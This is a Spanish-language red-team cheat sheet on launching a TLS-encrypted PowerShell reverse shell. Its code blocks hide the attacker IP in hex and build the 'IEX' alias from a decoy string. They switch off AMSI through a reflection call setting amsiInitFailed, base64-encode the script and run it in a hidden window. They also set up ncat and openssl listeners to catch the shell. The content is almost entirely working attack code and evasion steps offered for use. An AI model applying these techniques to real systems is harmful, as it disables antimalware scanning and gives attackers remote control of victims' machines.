## **TCP Reverse Shell mediante TLS en Powershell**

Todos los agradecimientos a estos dos enlaces, es puro virtuosismo lo que hay ahí, esto no es más que un copia y pega:

https://0xdarkvortex.dev/index.php/2019/07/17/red-team-ttps-part-1-amsi-evasion/

https://github.com/3v4Si0N/HTTP-revshell

**1.- Ofuscar la IP**

Básicamente se trata de crear los valores en hexadecimal:

```
printf "%x,%x,%x,%x\n" 192 168 11 34
c0,a8,b,22
```

```powershell
$px = "c0","a8","b","22"
$p = ($px | ForEach { [convert]::ToInt32($_,16) }) -join '.'
```

**2.- Ofuscar la cadena IEX**

Establecemos un alias con los valores de una cadena aleatoria, extrayendo la cadena con los índices del array:

```powershell
$x = "new-exercise"
Set-alias $x  ($x[$true-4] + ($x[[byte]("0x" + "FF") - 263]) + $x[[byte]("0x" + "ba") - 193]) .'
```
Aquí otro método que he visto, pero la idea es utilizar el tuyo propio:
```powershell
[array]$shurmano = "I","n","t","E","r","n","e","X" ;
set-alias new-exercise $($shurmano | foreach { if ($_ -cmatch '[A-Z]' -eq $true) {$x += $_}}; $x)
```

**3.- Una vez ofuscado, deshabilitar AMSI para lanzar script**
Echad un vistazo a la función PatchMe del [tls reverse shell(https://github.com/g4ngli0s/chuletas/blob/master/bypasspowershell/tlsrevshell.ps1)] donde lo que realmente hace es cifrar esto:

```powershell
[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('Syste' + 'm.Ref' + 'lect' + 'ion.Bi' + 'ndi' + 'ngF' + 'lags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('Syste' + 'm.Typ' +
 'e')), [Object]([Ref].Assembly.GetType('Syste' + 'm.Man' + 'agemen' + 't.Automa' + 'tion.Am' + 'siU' + 'ti' + 'ls')),('GetF' + 'ield')).Invoke('am' + 'siIn' + 'itFai' + 'led',(('NonPu' + 'blic,S' + 'tatic') -as [String].Assembly
.GetType('Syste' + 'm.Refl' + 'ection.B' + 'indingF' + 'lags'))).SetValue($null,$True)
```

**4.- Pasar el script de powershell a base64**

```
cat tlsrevshell.ps1 | iconv -f UTF8 -t UTF16LE | base64 -w 0
```

**5.- Ejecutarlo desde consola PS**

```
powershell -noP -sta -w 1 -enc ENC64SCRIPT
```

Como muestra de estás técnicas os dejo el [TCP reverse shell con TLS](https://github.com/g4ngli0s/chuletas/blob/master/bypasspowershell/tlsrevshell.ps1), como listener en vuestra máquina kali podéis usar ncat u openssl:

```
ncat --allow <IP> -vnl <PORT> --ssl
```
```
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port <PORT>
```

